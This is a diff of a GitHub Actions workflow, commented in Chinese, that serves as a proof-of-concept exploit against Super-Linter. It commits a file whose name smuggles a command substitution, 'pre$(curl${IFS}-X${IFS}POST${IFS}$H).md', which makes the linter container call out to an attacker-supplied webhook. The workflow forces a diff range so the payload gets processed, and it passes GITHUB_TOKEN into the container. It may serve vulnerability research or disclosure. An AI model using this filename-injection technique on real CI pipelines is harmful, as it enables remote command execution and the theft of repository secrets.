@@ -21,45 +21,50 @@ jobs:
 
       - name: 1. Setup Git & Payload
         run: |
-          # 1. 重置 Git 环境 (模拟 PR 状态)
           rm -rf .git
           git init
           git config --global user.email "attacker@example.com"
           git config --global user.name "Attacker"
           
-          # 2. 创建基准分支
+          # 1. 创建基准分支 (master)
           echo "safe" > README.md
           git add README.md
           git commit -m "init"
           git branch -m master
           
-          # 3. 构造 Payload (环境变量法)
-          # 注意：文件名里只有变量名 $H，没有斜杠，所以 touch 不会报错！
-          # 我们用单引号包围，防止在当前 Runner Shell 里被展开
-          PAYLOAD_NAME='pre$(curl -fsS -X POST $H).md'
+          # 【关键】保存基准 Commit 的 SHA
+          echo "MASTER_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
           
-          echo "Creating file: $PAYLOAD_NAME"
+          # 2. 构造 Payload (使用环境变量法，无斜杠，无空格)
+          # 文件名: pre$(curl${IFS}-X${IFS}POST${IFS}$H).md
+          # 我们用 ${IFS} 替代空格，防止 parallel 或 shell 在参数分割时出问题
+          # $H 是后面传入的 Webhook URL
+          PAYLOAD_NAME='pre$(curl${IFS}-X${IFS}POST${IFS}$H).md'
+          
+          echo "Creating malicious file: $PAYLOAD_NAME"
           touch "$PAYLOAD_NAME"
           
-          # 4. 提交恶意文件 (必须提交，否则 git diff 看不到)
+          # 3. 提交
           git add "$PAYLOAD_NAME"
           git commit -m "add exploit"
           
-          # 5. 记录 Commit SHA
+          # 【关键】保存当前 Commit 的 SHA
           echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
 
-      - name: 2. Run Super-Linter (Trigger Exploit)
+      - name: 2. Run Super-Linter (Force Diff)
         continue-on-error: true
         run: |
-          echo "Testing against: ${{ inputs.target_version }}"
+          echo "Testing version: ${{ inputs.target_version }}"
+          echo "Diff Range: ${{ env.MASTER_SHA }} ... ${{ env.CURRENT_SHA }}"
           
-          # 这里的 H 变量就是我们传入的 Webhook URL
-          # 容器内的 Shell 在处理文件名时会展开 $H
+          # 环境变量法：把 URL 传给 H
+          # 显式指定 BEFORE_SHA，强迫它算出 Diff
           
           docker run --rm \
             -e RUN_LOCAL=true \
             -e VALIDATE_ALL_CODEBASE=false \
             -e DEFAULT_BRANCH=master \
+            -e GITHUB_BEFORE_SHA=${{ env.MASTER_SHA }} \
             -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
             -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
             -e H="${{ inputs.webhook_url }}" \
@@ -68,4 +73,4 @@ jobs:
             
       - name: 3. Verify
         run: |
-          echo "Done. Please check ${{ inputs.webhook_url }}"
+          echo "Please check ${{ inputs.webhook_url }}"
